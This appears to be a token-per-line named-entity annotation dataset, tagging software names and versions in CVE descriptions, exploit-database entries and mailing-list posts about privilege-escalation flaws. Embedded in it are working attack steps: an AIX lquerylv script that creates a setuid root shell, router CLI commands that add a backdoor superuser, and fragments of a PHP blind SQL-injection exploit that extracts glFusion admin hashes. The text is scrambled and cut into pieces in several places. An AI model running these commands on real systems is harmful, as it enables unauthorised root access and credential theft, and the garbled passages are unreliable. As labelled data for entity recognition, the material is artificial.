Server O
in O
Android SN
6.0 SV
before SV
2015-12-01 SV
allows O
attackers O
to O
obtain O
sensitive O
information O
and O
consequently O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
internal O
bug O
23936840 O
. O

IOFireWireFamily O
in O
Apple SN
OS SN
X SN
before SV
10.10.5 SV
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
unspecified O
vectors O
, O
a O
different O
vulnerability O
than O
CVE-2015-3769 O
and O
CVE-2015-3771 O
. O

vmware-vmx.exe O
in O
VMware SN
Workstation SN
7.x SV
through SV
10.x SV
before SV
10.0.7 SV
and SV
11.x SV
before SV
11.1.1 SV
, O
VMware SN
Player SN
5.x SV
and SV
6.x SV
before SV
6.0.7 SV
and SV
7.x SV
before SV
7.1.1 SV
, O
and O
VMware SN
Horizon SN
Client SN
5.x SV
local-mode SV
before SV
5.4.2 SV
on O
Windows O
does O
not O
provide O
a O
valid O
DACL O
pointer O
during O
the O
setup O
of O
the O
vprintproxy.exe O
process O
, O
which O
allows O
host O
OS O
users O
to O
gain O
host O
OS O
privileges O
by O
injecting O
a O
thread O
. O

Microsoft SN
Access SN
2007 SV
SP3 SV
, O
Excel SN
2007 SV
SP3 SV
, O
InfoPath SN
2007 SV
SP3 SV
, O
OneNote SN
2007 SV
SP3 SV
, O
PowerPoint SN
2007 SV
SP3 SV
, O
Project SN
2007 SV
SP3 SV
, O
Publisher SN
2007 SV
SP3 SV
, O
Visio SN
2007 SV
SP3 SV
, O
Word SN
2007 SV
SP3 SV
, O
Office SN
2007 SV
IME SN
( O
Japanese O
) O
SP3 SV
, O
Access SN
2010 SV
SP2 SV
, O
Excel SN
2010 SV
SP2 SV
, O
InfoPath SN
2010 SV
SP2 SV
, O
OneNote SN
2010 SV
SP2 SV
, O
PowerPoint SN
2010 SV
SP2 SV
, O
Project SN
2010 SV
SP2 SV
, O
Publisher SN
2010 SV
SP2 SV
, O
Visio SN
2010 SV
SP2 SV
, O
Word SN
2010 SV
SP2 SV
, O
Pinyin SN
IME SN
2010 SV
, O
Access SN
2013 SV
SP1 SV
, O
Excel SN
2013 SV
SP1 SV
, O
InfoPath SN
2013 SV
SP1 SV
, O
OneNote SN
2013 SV
SP1 SV
, O
PowerPoint SN
2013 SV
SP1 SV
, O
Project SN
2013 SV
SP1 SV
, O
Publisher SN
2013 SV
SP1 SV
, O
Visio SN
2013 SV
SP1 SV
, O
Word SN
2013 SV
SP1 SV
, O
Excel SN
2013 SV
RT SV
SP1 SV
, O
OneNote SN
2013 SV
RT SV
SP1 SV
, O
PowerPoint SN
2013 SV
RT SV
SP1 SV
, O
Word SN
2013 SV
RT SV
SP1 SV
, O
Access SN
2016 SV
, O
Excel SN
2016 SV
, O
OneNote SN
2016 SV
, O
PowerPoint SN
2016 SV
, O
Project SN
2016 SV
, O
Publisher SN
2016 SV
, O
Visio SN
2016 SV
, O
Word SN
2016 SV
, O
Skype SN
for SN
Business SN
2016 SV
, O
Lync SN
2013 SV
SP1 SV
allow O
remote O
attackers O
to O
bypass O
a O
sandbox O
protection O
mechanism O
and O
gain O
privileges O
via O
a O
crafted O
web O
site O
that O
is O
accessed O
with O
Internet O
Explorer O
, O
as O

Microsoft SN
Windows SN
Vista SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
Windows SN
RT SV
Gold SV
and SV
8.1 SV
, O
and O
Windows SN
10 SV
Gold SV
and SV
1511 SV
allow O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
that O
triggers O
a O
Winsock O
call O
referencing O
an O
invalid O
address O
, O
aka O
Winsock O
Elevation O
of O
Privilege O
Vulnerability O
. O

The O
Windows O
Installer O
service O
in O
Microsoft SN
Windows SN
Server SV
2003 SV
SP2 SV
and SV
R2 SV
SP2 SV
, O
Windows SN
Vista SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
and O
Windows SN
RT SV
Gold SV
and SV
8.1 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
custom O
action O
script O
associated O
with O
a O
.msi O
package O
, O
aka O
Windows O
Installer O
EoP O
Vulnerability O
. O

Microsoft SN
Internet SN
Explorer SN
7 SV
through SV
11 SV
allows O
remote O
attackers O
to O
gain O
privileges O
via O
a O
crafted O
web O
site O
, O
aka O
Internet O
Explorer O
Elevation O
of O
Privilege O
Vulnerability O
, O
a O
different O
vulnerability O
than O
CVE-2015-1748 O
. O

Cisco SN
Web SN
Security SN
Appliance SN
( O
WSA SN
) O
devices O
with O
software O
8.5.0-ise-147 SV
do O
not O
properly O
restrict O
use O
of O
the O
pickle O
Python O
module O
during O
certain O
tunnel-status O
checks O
, O
which O
allows O
local O
users O
to O
execute O
arbitrary O
Python O
code O
and O
gain O
privileges O
via O
crafted O
serialized O
objects O
, O
aka O
Bug O
ID O
CSCut39230 O
. O

platform/msm_shared/mmc.c O
in O
the O
Qualcomm O
components O
in O
Android SN
before SV
2016-07-05 SV
on O
Nexus SN
7 SV
( O
2013 SV
) O
devices O
mishandles O
the O
power-on O
write-protect O
feature O
, O
which O
allows O
attackers O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Android O
internal O
bug O
28821253 O
and O
Qualcomm O
internal O
bug O
CR580567 O
. O

arch/arm/mach-msm/ipc_router.c O
in O
the O
Qualcomm O
components O
in O
Android SN
before SV
2016-07-05 SV
on O
Nexus SN
5 SV
devices O
uses O
an O
incorrect O
integer O
data O
type O
, O
which O
allows O
attackers O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Android O
internal O
bug O
28769399 O
and O
Qualcomm O
internal O
bug O
CR550606 O
. O

The O
vid_dec_set_h264_mv_buffers O
function O
in O
drivers/video/msm/vidc/common/dec/vdec.c O
in O
the O
Qualcomm O
components O
in O
Android SN
before SV
2016-07-05 SV
on O
Nexus SN
5 SV
and SV
7 SV
( O
2013 O
) O
devices O
does O
not O
validate O
the O
number O
of O
buffers O
, O
which O
allows O
attackers O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Android O
internal O
bug O
28598515 O
and O
Qualcomm O
internal O
bug O
CR563694 O
. O

vfe31_proc_general O
function O
in O
drivers/media/video/msm/vfe/msm_vfe31.c O
in O
the O
MSM-VFE31 O
driver O
for O
the O
Linux SN
kernel SN
3.x SV
, O
as O
used O
in O
Qualcomm O
Innovation O
Center O
( O
QuIC O
) O
Android O
contributions O
for O
MSM O
devices O
and O
other O
products O
, O
does O
not O
validate O
a O
certain O
id O
value O
, O
which O
allows O
attackers O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
an O
application O
that O
makes O
a O
crafted O
ioctl O
call O
. O

lquerylv O
in O
cmdlvm O
in O
IBM SN
AIX SN
5.3 SV
, O
6.1 SV
, O
and SV
7.1 SV
and O
VIOS SN
2.2.x SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
DBGCMD_LQUERYLV O
environment-variable O
value O
. O

Tested O
on O
: O
AIX SN
7.1 SV
( O
7100-02-03-1334 O
) O
CVE O
: O
CVE-2014-8904 O
From O
file O
writing O
to O
command O
execution O
; O
) O
export O
_DBGCMD_LQUERYLV=1 O
umask O
0 O
ln O
-s O
/etc/suid_profile O
/tmp/DEBUGCMD O
/usr/sbin/lquerylv O
cat O
EOF O
> O
/etc/suid_profile O
cp O
/bin/ksh O
/tmp/r00tshell O
/usr/bin/syscall O
setreuid O
0 O
0 O
chown O
root O
: O
system O
/tmp/r00tshell O
chmod O
6755 O
/tmp/r00tshell O
EOF O
/opt/IBMinvscout/bin/invscoutClient_VPD_Survey O
suid_profile O
because O
uid O
! O
=euid O
/tmp/r00tshell O

! O
/bin/sh O

Vendor O
Homepage O
: O
Software O
Link O
: O
- O
Version O
: O
- O

Exploit O
Title O
: O
AIX SN
7.1 SV
lquerylv O
privilege O
escalation O
Date O
: O
2015.10.30 O
Exploit O
Author O
: O
S2 O
Crew O
[ O
Hungary O
] O

AIX SN
7.1 SV
- O
lquerylv O
Local O
Privilege O
Escalation O

The O
administrative O
interface O
in O
Allied SN
Telesis SN
AT-RG634A SN
ADSL SN
Broadband SN
router SN
3.3+ SV
, O
iMG624A SN
3.5 SV
, O
iMG616LH SN
2.4 SV
, O
and O
iMG646BD SN
3.5 SV
allows O
remote O
attackers O
to O
gain O
privileges O
and O
execute O
arbitrary O
commands O
via O
a O
direct O
request O
to O
cli.html O
. O

Steps O
to O
reproduce O
: O
- O
Connect O
via O
HTTP O
to O
the O
hidden O
page O
IP O
> O
/cli.html O
a O
input O
box O
is O
shown O
, O
every O
command O
typed O
there O
will O
be O
executed O
as O
admin O
. O

Credits O
: O
This O
security O
issue O
was O
discovered O
and O
researched O
by O
Sebastian O
Muniz O
( O
topo O
) O
, O
Security O
Researcher O
of O
Groundworks O
Technologies O
( O
contents O
of O
this O
advisory O
are O
copyright O
( O
c O
) O
2014 O
Groundworks O
Technologies O
, O
and O
are O
licensed O
under O
a O
Creative O
Commons O
Attribution O
Non-Commercial O
Share-Alike O
3.0 O
( O
United O
States O
) O
License O
: O

Vulnerability O
Information O
: O
- O
CVE O
: O
CVE-2014-1982 O
- O
Type O
of O
Vulnerability O
: O
- O
CWE-78 O
: O
OS O
Command O
Injection O
- O
CWE-306 O
: O
Missing O
Authentication O
for O
Critical O
Function O
Affected O
products O
: O
- O
Allied O
Telesis O
AT-RG634A O
ADSL O
Broadband O
router O
. O

( O
version O
3.3+ O
and O
probably O
others O
) O
Other O
products O
like O
, O
- O
Allied O
Telesis O
iMG624A O
( O
firmware O
version O
, O
3.5 O
) O
- O
Allied O
Telesis O
iMG616LH O
( O
firmware O
version O
, O
+2.4 O
) O
- O
Allied O
Telesis O
iMG646BD O
( O
firmware O
version O
, O
3.5 O
) O
Vendor O
: O
- O
Allied O
Telesis O
: O
the O
same O
vulnerbility O
, O
but O
the O
vendor O
reports O
that O
the O
version O
3.8.05 O
of O
the O
firmware O
has O
already O
addressed O
this O
issue O
, O
but O
we O
where O
unable O
to O
test O
nor O
confirm O
this O
information O
. O

Entering O
the O
following O
lines O
in O
the O
hidden O
page O
( O
/cli.html O
) O
a O
new O
telnet O
admin O
user O
called O
eviluser O
is O
added O
to O
the O
system O
. O

Configure O
the O
device O
so O
that O
only O
trusted O
devices O
can O
access O
the O
target O
device O
using O
the O
following O
command O
, O
WEBSERVER O
SET O
MANAGEMENTIP O
< O
ip-address O
> O
Short O

The O
RG634 O
supports O
Layer O
3 O
functions O
, O
including O
NAT O
, O
DMZ O
, O
and O
Stateful O
inspection O
firewall O
for O
delivery O
of O
revenue-generating O
services O
such O
as O
home O
networking O
and O
security O
services O
. O

Description O
: O
The O
Allied O
Telesis O
AT-RG634A O
ADSL O
Broadband O
router O
has O
a O
hidden O
url O
page O
in O
their O
admnistrative O
HTTP O
interface O
capable O
of O
executing O
commands O
as O
admin O
without O
requiring O
any O
kind O
of O
authentication O
. O

system O
add O
login O
eviluser O
system O
set O
user O
eviluser O
access O
superuser O
. O

Having O
as O
impact O
a O
total O
compromise O
of O
the O
target O
device O
. O

Description O
: O
The O
AT-RG634 O
is O
a O
full-featured O
, O
broadband O
media O
gateway O
and O
router O
designed O
for O
cost-effective O
delivery O
of O
advanced O
IP O
Triple O
Play O
voice O
, O
video O
and O
data O
services O
over O
an O
ADSL O
infrastructure O
. O

( O
from O
) O
The O
Allied O
Telesis O
AT-RG634A O
ADSL O
Broadband O
router O
has O
a O
hidden O
URL O
( O
/cli.html O
) O
page O
to O
execute O
CLI O
command O
with O
admin O
priviledges O
, O
available O
by O
default O
and O
without O
any O
kind O
of O
authentication O
. O

Security O
Patches O
Workaround O
: O
- O
Allied O
Telesis O
has O
noted O
that O
the O
AT-RG634A O
product O
is O
no O
longer O
supported O
, O
but O
gives O
a O
workaround O
to O
mitigate O
the O
issue O
. O

Title O
: O
Allied O
Telesis O
AT-RG634A O
ADSL O
Broadband O
router O
hidden O
administrative O
unauthenticated O
webshell O
. O

Allied O
Telesis O
AT-RG634A O
ADSL O
Broadband O
Router O
- O
Unauthenticated O
Web O
Shell O

The O
raw_cmd_copyin O
function O
in O
drivers/block/floppy.c O
in O
the O
Linux SN
kernel SN
through SV
3.14.3 SV
does O
not O
properly O
handle O
error O
conditions O
during O
processing O
of O
an O
FDRAWCMD O
ioctl O
call O
, O
which O
allows O
local O
users O
to O
trigger O
kfree O
operations O
and O
gain O
privileges O
by O
leveraging O
write O
access O
to O
a O
/dev/fd O
device O
. O

Signed-off-by O
: O
Matthew O
Daley O
< O
mattd O
@ O
... O
fuzz.com O
References O
: O
CVE-2014-1738 O
Signed-off-by O
: O
Linus O
Torvalds O
< O
torvalds O
@ O
... O
ux-foundation.org O
commit O
ef87dbe7614341c2e7bfe8d32fcb7028cc97442c O
Author O
: O
Matthew O
Daley O
< O
mattd O
@ O
... O
fuzz.com O
Date O
: O
Mon O
Apr O
28 O
19:05:20 O
2014 O
+1200 O
floppy O
: O
ignore O
kernel-only O
members O
in O
FDRAWCMD O
ioctl O
input O
Always O
clear O
out O
these O
floppy_raw_cmd O
struct O
members O
after O
copying O
the O
entire O
structure O
from O
userspace O
so O
that O
the O
in-kernel O
version O
is O
always O
valid O
and O
never O
left O
in O
an O
interdeterminate O
state O
. O

This O
includes O
the O
linked-list O
pointer O
and O
the O
pointer O
to O
the O
allocated O
DMA O
space O
. O

Linux O
Kernel O
Mainline O
commits O
: O
2145e15e0557a01b9195d1c7199a1b92cb9be81f O
Author O
: O
Matthew O
Daley O
< O
mattd O
@ O
... O
fuzz.com O
Date O
: O
Mon O
Apr O
28 O
19:05:21 O
2014 O
+1200 O
floppy O
: O
don O
t O
write O
kernel-only O
members O
to O
FDRAWCMD O
ioctl O
output O
Do O
not O
leak O
kernel-only O
floppy_raw_cmd O
structure O
members O
to O
userspace O
. O

There O
apparently O
exists O
a O
proof O
of O
concept O
root O
exploit O
, O
that O
allows O
local O
users O
with O
access O
to O
a O
floppy O
device O
to O
execute O
code O
in O
the O
linux O
kernel O
. O

Subject O
: O
Linux O
kernel O
floppy O
ioctl O
kernel O
code O
execution O

( O
I O
think O
this O
needs O
a O
floppy O
driver O
to O
actually O
allow O
access O
to O
a O
floppy O
device O
. O

Reported O
by O
Matthew O
Daley O
to O
security O
@ O
... O
nel.org O
. O

My O
machine O
only O
says O
floppy0 O
: O
no O
floppy O
controllers O
found O
today O
. O
) O

Signed-off-by O
: O
Matthew O
Daley O
< O
mattd O
@ O
... O
fuzz.com O
References O
: O
CVE-2014-1737 O
Signed-off-by O
: O
Linus O
Torvalds O
< O
torvalds O
@ O
... O
ux-foundation.org O
Ciao O
, O
Marcus O

Date O
: O
Fri O
, O
9 O
May O
2014 O
09:13:30 O
+0200 O
From O
: O
Marcus O
Meissner O
< O
meissner O
@ O
... O
e.de O
To O
: O
OSS O
Security O
List O
< O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
mattd O
@ O
... O
fuzz.com O

Hi O
, O
As O
this O
was O
posted O
to O
linux-distros O
, O
and O
was O
supposed O
to O
be O
made O
public O
earlier O
this O
week O
, O
but O
so O
far O
wasn O
t O
published O
on O
oss-sec O
... O

The O
futex_wait O
function O
in O
kernel/futex.c O
in O
the O
Linux SN
kernel SN
before SV
2.6.37 SV
does O
not O
properly O
maintain O
a O
certain O
reference O
count O
during O
requeue O
operations O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
use-after-free O
and O
system O
crash O
) O
or O
possibly O
gain O
privileges O
via O
a O
crafted O
application O
that O
triggers O
a O
zero O
count O
. O

FortiGuard SN
FortiAuthenticator SN
before SV
3.0 SV
allows O
remote O
administrators O
to O
gain O
privileges O
via O
the O
command O
line O
interface O
. O

Race O
condition O
in O
win32k.sys O
in O
the O
kernel-mode O
drivers O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
Windows SN
Server SV
2003 SV
SP2 SV
, O
Windows SN
Vista SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
, O
R2 SV
, O
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
Gold SV
and SV
SP1 SV
, O
Windows SN
8 SV
, O
Windows SN
Server SV
2012 SV
, O
and O
Windows SN
RT SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
that O
leverages O
improper O
handling O
of O
objects O
in O
memory O
, O
aka O
Win32k O
Race O
Condition O
Vulnerability O
. O

The O
Microsoft O
Antimalware O
Client O
in O
Windows O
Defender O
on O
Windows SN
8 SV
and O
Windows SN
RT SV
uses O
an O
incorrect O
pathname O
for O
MsMpEng.exe O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Microsoft O
Antimalware O
Improper O
Pathname O
Vulnerability O
. O

The O
ACMELOGIN O
implementation O
in O
HP SN
OpenVMS SN
8.3 SV
and SV
8.4 SV
on O
the O
Alpha O
platform O
, O
and O
8.3 SV
, O
8.3-1H1 SV
, O
and SV
8.4 SV
on O
the O
Itanium O
platform O
, O
when O
the O
SYS O
$ O
ACM O
system O
service O
is O
enabled O
, O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

Integer O
overflow O
in O
the O
Client/Server O
Run-time O
Subsystem O
( O
aka O
CSRSS O
) O
in O
the O
Win32 O
subsystem O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
and O
Windows SN
Server SV
2003 SV
SP2 SV
, O
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
application O
that O
triggers O
an O
incorrect O
memory O
assignment O
for O
a O
user O
transaction O
, O
aka O
CSRSS O
Local O
EOP O
SrvWriteConsoleOutputString O
Vulnerability O
. O

Buffer O
overflow O
in O
the O
Journal O
Based O
Backup O
( O
JBB O
) O
feature O
in O
the O
backup-archive O
client O
in O
IBM SN
Tivoli SN
Storage SN
Manager SN
( O
TSM SN
) O
before SV
5.4.3.4 SV
, O
5.5.x SV
before SV
5.5.3 SV
, O
6.x SV
before SV
6.1.4 SV
, O
and SV
6.2.x SV
before SV
6.2.2 SV
on O
Windows O
and O
AIX O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

NOTE O
: O
some O
of O
these O
details O
are O
obtained O
from O
third O
party O
information O
. O

Untrusted O
search O
path O
vulnerability O
in O
PKZIP SN
before SV
12.50.0014 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
dwmapi.dll O
file O
in O
the O
current O
working O
directory O
, O
as O
demonstrated O
by O
a O
directory O
that O
contains O
a O
.zip O
file O
. O

Multiple O
untrusted O
search O
path O
vulnerabilities O
in O
Nuance SN
PDF SN
Reader SN
6.0 SV
allow O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
( O
1 O
) O
dwmapi.dll O
or O
( O
2 O
) O
exceptiondumpdll.dll O
file O
in O
the O
current O
working O
directory O
, O
as O
demonstrated O
by O
a O
directory O
that O
contains O
a O
.pdf O
file O
. O

Unspecified O
vulnerability O
in O
Microsoft O
Windows O
on O
32-bit O
platforms O
allows O
local O
users O
to O
gain O
privileges O
via O
unknown O
vectors O
, O
as O
exploited O
in O
the O
wild O
in O
July O
2010 O
by O
the O
Stuxnet O
worm O
, O
and O
identified O
by O
Microsoft O
researchers O
and O
other O
researchers O
. O

The O
( O
1 O
) O
mdb O
and O
( O
2 O
) O
mdb-symbolreader O
scripts O
in O
mono-debugger SN
2.4.3 SV
, O
and SV
other SV
versions SV
before SV
2.8.1 SV
, O
place O
a O
zero-length O
directory O
name O
in O
the O
LD_LIBRARY_PATH O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
shared O
library O
in O
the O
current O
working O
directory O
. O

NOTE O
: O
this O
might O
overlap O
CVE-2010-3141 O
and O
CVE-2010-3142 O
. O

Untrusted O
search O
path O
vulnerability O
in O
Microsoft SN
Office SN
2007 SV
SP2 SV
and SV
2010 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
DLL O
in O
the O
current O
working O
directory O
, O
aka O
Insecure O
Library O
Loading O
Vulnerability O
. O

The O
Windows O
kernel-mode O
drivers O
in O
win32k.sys O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
Windows SN
Server SV
2003 SV
SP2 SV
, O
Windows SN
Vista SV
SP1 SV
and SV
SP2 SV
, O
and O
Windows SN
Server SV
2008 SV
Gold SV
and SV
SP2 SV
do O
not O
properly O
validate O
user-mode O
input O
passed O
to O
kernel O
mode O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Win32k O
User O
Input O
Validation O
Vulnerability O
. O

The O
Client/Server O
Runtime O
Subsystem O
( O
aka O
CSRSS O
) O
in O
the O
Win32 O
subsystem O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
and SV
Server SV
2003 SV
SP2 SV
, O
when O
a O
Chinese O
, O
Japanese O
, O
or O
Korean O
locale O
is O
enabled O
, O
does O
not O
properly O
allocate O
memory O
for O
transactions O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
CSRSS O
Local O
Elevation O
of O
Privilege O
Vulnerability O
. O

The O
USB O
service O
in O
VMware SN
Workstation SN
7.0 SV
before SV
7.0.1 SV
build SV
227600 SV
and O
VMware SN
Player SN
3.0 SV
before SV
3.0.1 SV
build SV
227600 SV
on O
Windows O
might O
allow O
host O
OS O
users O
to O
gain O
privileges O
by O
placing O
a O
Trojan O
horse O
program O
at O
an O
unspecified O
location O
on O
the O
host O
OS O
disk O
. O

MeetingTime O
in O
Cisco SN
Unified SN
MeetingPlace SN
6 SV
before SV
MR5 SV
, O
and SV
possibly SV
5 SV
, O
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
via O
a O
modified O
authentication O
sequence O
, O
aka O
Bug O
ID O
CSCsv66530 O
. O

Use-after-free O
vulnerability O
in O
the O
fasync_helper O
function O
in O
fs/fcntl.c O
in O
the O
Linux SN
kernel SN
before SV
2.6.33-rc4-git1 SV
allows O
local O
users O
to O
gain O
privileges O
via O
vectors O
that O
include O
enabling O
O_ASYNC O
( O
aka O
FASYNC O
or O
FIOASYNC O
) O
on O
a O
locked O
file O
, O
and O
then O
closing O
this O
file O
. O

Heap-based O
buffer O
overflo O
w O
in O
w O
in O
Sun SN
Solaris SN
8 SV
through SV
10 SV
, O
and O
OpenSolaris SN
before SV
snv_124 SV
, O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

NOTE O
: O
this O
can O
be O
leveraged O
with O
a O
separate O
SQL O
injection O
vulnerability O
to O
steal O
hashes O
. O

glFusion SN
before SV
1.1.3 SV
performs O
authentication O
with O
a O
user-provided O
password O
hash O
instead O
of O
a O
password O
, O
which O
allows O
remote O
attackers O
to O
gain O
privileges O
by O
obtaining O
the O
hash O
and O
using O
it O
in O
the O
glf_password O
cookie O
, O
aka O
User O
Masquerading O
. O

< O
php O
glFusion SN
< SV
= SV
1.1.2 SV
COM_applyFilter O
( O
) O
/cookies O
remote O
blind O
sql O
injection O
exploit O
by O
Nine O
: O
Situations O
: O
Group O
: O
:bookoo O
our O
site O
: O
software O
site O
: O
google O
dork O
: O
Page O
created O
in O
seconds O
by O
glFusion O
+RSS O
Found O
another O
vector O
of O
injection O
in O
/private/system/lib-session.php O
near O
lines O
97-117 O
: O
... O
if O
( O
isset O
( O
$ O
_COOKIE O
[ O
$ O
_CONF O
[ O
cookie_session O
sessid O
= O
COM_applyFilter O
( O
$ O
_COOKIE O
[ O
$ O
_CONF O
[ O
cookie_session O
if O
( O
$ O
_SESS_VERBOSE O
) O
{ O
COM_errorLog O
( O
got O
$ O
sessid O
as O
the O
session O
id O
from O
lib-sessions.php O
,1 O
) O
; O
} O
$ O
userid O
= O
SESS_getUserIdFromSession O
( O
$ O
sessid O
, O
$ O
_CONF O
[ O
ession_cookie_timeout O
SERVER O
[ O
REMOTE_ADDR O
CONF O
[ O
cookie_ip O
] O
) O
; O
if O
( O
$ O
_SESS_VERBOSE O
) O
{ O
COM_errorLog O
( O
Got O
$ O
userid O
as O
User O
ID O
from O
the O
session O
ID O
,1 O
) O
; O
} O
if O
( O
$ O
userid O
1 O
) O
{ O
Check O
user O
status O
$ O
status O
= O
SEC_checkUserStatus O
( O
$ O
userid O
) O
; O
if O
( O
( O
$ O
status O
USER_ACCOUNT_ACTIVE O
status O
USER_ACCOUNT_AWAITING_ACTIVATION O
) O
) O
{ O
$ O
user_logged_in O
= O
1 O
; O
SESS_updateSessionTime O
( O
$ O
sessid O
, O
$ O
_CONF O
[ O
cookie_ip O
see O
SESS_updateSessionTime O
( O
) O
function O
near O
lines O
418-436 O
: O
... O
function O
SESS_updateSessionTime O
( O
$ O
sessid O
, O
$ O

hash O
: O
. O
$ O
_hash O
. O
[ O
] O

192.168.0.1 O
/glfusion O
bookoo O
pass O
. O

Examples O
: O
php O
. O
$ O
argv O
. O

prefix O
- O
try O
to O
extract O
table O
prefix O
from O
information.schema O
. O

; O
glfusion=9999999999 O
; O
; O
$ O
starttime O
= O
time O
( O
) O
; O
$ O
out O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
if O
( O
chk_err O
( O
$ O
out O
) O
) O
{ O
die O
( O
[ O
! O
] O

function O
find_prefix O
( O
) O
{ O
global O
$ O
host O
, O
$ O
port O
, O
$ O
path O
, O
$ O
delayfunc O
, O
$ O
_user O
, O
$ O
_pwd O
, O
$ O
n O
; O
$ O
_tn O
= O
TABLE_NAME O
; O
case O
important O

true O
: O
false O
; O
if O
( O
$ O
win O
) O
{ O
! O
dl O
( O
php_curl.dll O
) O

You O
need O
the O
curl O
extesion O
loaded O
! O

So O
the O
function O
returns O
a O
valid O
userid O
and O
, O
if O
you O
know O
an O
existent O
sessid O
in O
table O
, O
you O
can O
inject O
queries O
in O
cookies O
, O
like O
this O
: O
Cookie O
: O
glf_session=12345678 O
[ O
SQL O
HERE O
] O
; O
glfusion=9999999999 O
; O
This O
tool O
use O
delays O
to O
extract O
an O
admin O
hash O
from O
users O
table O
, O
but O
needs O
a O
simple O
user O
account O
; O
some O
improvement O
in O
find_prefix O
( O
) O
; O
working O
against O
MySQL O
> O
= O
5.0.12 O
, O
where O
SLEEP O
( O
) O
function O
is O
availiable O
or O
... O
if O
you O
find O
another O
solution O
for O
delays O
, O
with O
MySQL O
> O
= O
4.1 O
, O
which O
supports O
SELECT O
subqueries O
( O
BENCHMARK O
( O
) O
can O
not O
be O
used O
because O
commas O
are O
filtered O
by O
COM_applyFilter O
( O
) O
function O
) O
$ O
err O

print O
( O
[ O
] O
Attacking O
syntax O
( O
) O
; O
$ O
_f_prefix O
= O
false O
; O
$ O
_use_proxy O
= O
false O
; O
$ O
port O
= O
80 O
; O
$ O
_skiptest O
= O
false O
; O
$ O
_verbose O
= O
false O
; O
$ O
_test O
= O
false O
; O
for O
( O
$ O
i O
= O
3 O
; O
$ O
i O
< O
$ O
argc O
; O
$ O
i++ O
) O
{ O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
prefix O
f_prefix O
= O
true O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
proxy O
use_proxy O
= O
true O
; O
$ O
tmp O
= O
explode O
argv O
[ O
$ O
i O
] O
) O
; O
$ O
proxy_host O
= O
$ O
tmp O
; O
$ O
proxy_port O
= O
( O
int O
) O
$ O
tmp O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
port O
tmp O
= O
explode O
argv O
[ O
$ O
i O
] O
) O
; O
$ O
port O
= O
( O
int O
) O
$ O
tmp O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
uid O
tmp O
= O
explode O
argv O
[ O
$ O
i O
] O
) O
; O
$ O
uid O
= O
( O
int O
) O
$ O
tmp O
; O
$ O
where O
= O
uid= O
$ O
uid O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O

) O
; O
} O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_RETURNTRANSFER O
, O
1 O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_USERAGENT O
, O
Mozilla/5.0 O
( O
Windows O
; O
U O
; O
Windows O
NT O
5.1 O
; O
it O
; O
rv:1.9.0.7 O
) O
Gecko/2009021910 O
Firefox/3.0.7 O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_TIMEOUT O
, O
0 O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_HEADER O
, O
1 O
) O
; O
$ O
cookies O
= O
array O
( O
Cookie O
: O
. O
$ O
ck O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_HTTPHEADER O
, O
$ O
cookies O
) O
; O
if O
( O
$ O
_use_proxy O
) O
{ O
curl_setopt O
( O
$ O
ch O
, O
